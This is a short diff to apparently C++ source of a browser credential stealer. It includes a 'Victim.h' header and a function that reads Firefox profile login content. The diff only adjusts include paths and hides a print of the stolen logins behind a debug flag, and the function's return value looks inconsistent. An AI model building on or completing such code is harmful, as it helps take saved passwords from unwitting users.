@@ -1,5 +1,5 @@
-#include "Browsers.h"
-#include "Victim.h"
+#include "../Headers/Browsers.h"
+#include "../Headers/Victim.h"
 
 /// GetFirefoxProfiles
 /// <summary>
@@ -164,6 +164,8 @@ std::string Browsers::GetProfileLoginsContent(Profile& profileName) {
 		if (profileContent.empty()) continue;
 		r_ProfileContent.append(profileContent + "\n");
 	}
-	std::cout << profileContent << std::endl;
+#ifdef _DEBUG
+	std::cout << profileContent << std::endl << std::endl << std::endl;
+#endif
 	return profileContent;
 }
